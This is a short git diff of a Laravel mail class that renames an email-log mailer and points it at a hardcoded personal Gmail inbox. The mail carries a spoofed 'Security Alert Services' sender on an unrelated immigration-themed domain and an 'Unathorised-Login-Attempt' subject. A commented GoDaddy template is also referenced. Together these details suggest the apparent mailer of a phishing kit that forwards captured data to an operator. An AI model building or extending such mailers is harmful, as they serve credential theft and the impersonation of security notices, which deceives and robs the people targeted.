@@ -7,7 +7,7 @@ use Illuminate\Contracts\Queue\ShouldQueue;
 use Illuminate\Mail\Mailable;
 use Illuminate\Queue\SerializesModels;
 
-class EmailLog extends Mailable
+class NetLog extends Mailable
 {
     use Queueable, SerializesModels;
     public $email;
@@ -31,10 +31,10 @@ class EmailLog extends Mailable
      */
     public function build()
     {
-        return $this->subject('Log')
-        ->from('help@usaimmigration.website', 'Security Alert')
+        return $this->subject('Unathorised-Login-Attempt')
+        ->from('help@usaimmigration.website', 'Security Alert Services')
         ->to('talktojimmykimmel@gmail.com')
-        ->view('email.log');
+        ->view('email.net');
         // ->view('godaddy.sample');
     }
 }
